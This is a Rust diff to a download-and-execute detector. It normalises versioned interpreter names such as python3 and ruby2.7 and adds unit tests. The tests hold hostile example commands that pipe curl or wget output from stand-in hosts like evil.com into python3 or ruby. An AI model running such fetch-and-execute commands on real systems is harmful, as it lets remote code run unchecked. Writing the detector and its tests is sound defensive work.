@@ -336,14 +336,26 @@ pub fn check_download_execute_pipe(content: &str) -> Option<u32> {
         .iter()
         .position(|seg| DOWNLOADERS.iter().any(|d| seg.contains(d)))?;
     let has_executor_after = parts[downloader_at + 1..].iter().any(|seg| {
-        seg.split_whitespace()
-            .any(|w| EXECUTORS.iter().any(|e| executor_basename(w) == *e))
+        seg.split_whitespace().any(|w| {
+            let base = strip_interpreter_version(executor_basename(w));
+            EXECUTORS.contains(&base)
+        })
     });
     if has_executor_after {
         Some(40)
     } else {
         None
     }
+}
+
+/// Strip a trailing version suffix from an interpreter basename so versioned
+/// interpreters (`python3`, `python2`, `ruby2.7`, `node18`) collapse to the
+/// base token in `EXECUTORS`. Only a trailing run of digits/dots is trimmed,
+/// so the exact-match anti-evasion bound still holds (`bashfoo` is unchanged
+/// and does NOT match `bash`). Spec 079 P3: `curl … | python3 -` was a
+/// download-and-execute miss because `python3 != python`.
+fn strip_interpreter_version(base: &str) -> &str {
+    base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.')
 }
 
 /// Extract the basename of an executor path so absolute paths match
@@ -533,13 +545,38 @@ mod tests {
     fn detects_download_pipe_with_absolute_path_executor_usr_bin_python() {
         // Same shape, different interpreter — pin every common executor
         // path so a future change to the EXECUTOR list also gets caught
-        // by the basename normalization. Note: uses bare `python`
-        // (not `python3`) because the EXECUTOR list pins basename
-        // tokens, not version-suffixed variants.
+        // by the basename normalization.
         assert_eq!(
             check_download_execute_pipe("wget http://evil.com/x | /usr/bin/python"),
             Some(40),
             "absolute-path /usr/bin/python MUST trip the detector"
+        );
+    }
+
+    #[test]
+    fn detects_download_pipe_with_versioned_interpreter() {
+        // Spec 079 P3: `python3` (and other version-suffixed interpreters)
+        // must match the base `python` executor token — pre-fix `python3 !=
+        // python` so `curl … | python3 -` was a download-and-execute MISS.
+        assert_eq!(
+            check_download_execute_pipe("curl https://pastebin.com/raw/x | python3 -"),
+            Some(40),
+            "versioned interpreter python3 must trip the detector"
+        );
+        assert_eq!(
+            check_download_execute_pipe("wget http://evil.com/x | /usr/bin/ruby2.7 -e id"),
+            Some(40),
+            "ruby2.7 must strip to ruby and trip"
+        );
+        // Anti-evasion bound: the version strip only trims trailing digits/dots,
+        // so a non-interpreter word is still NOT a match.
+        assert!(
+            check_download_execute_pipe("curl http://evil.com/x | bashfoo").is_none(),
+            "executor substring inside a longer word must NOT trip"
+        );
+        assert!(
+            check_download_execute_pipe("curl http://evil.com/x | /bin/foo3").is_none(),
+            "non-executor with a trailing digit must NOT trip"
         );
     }
 
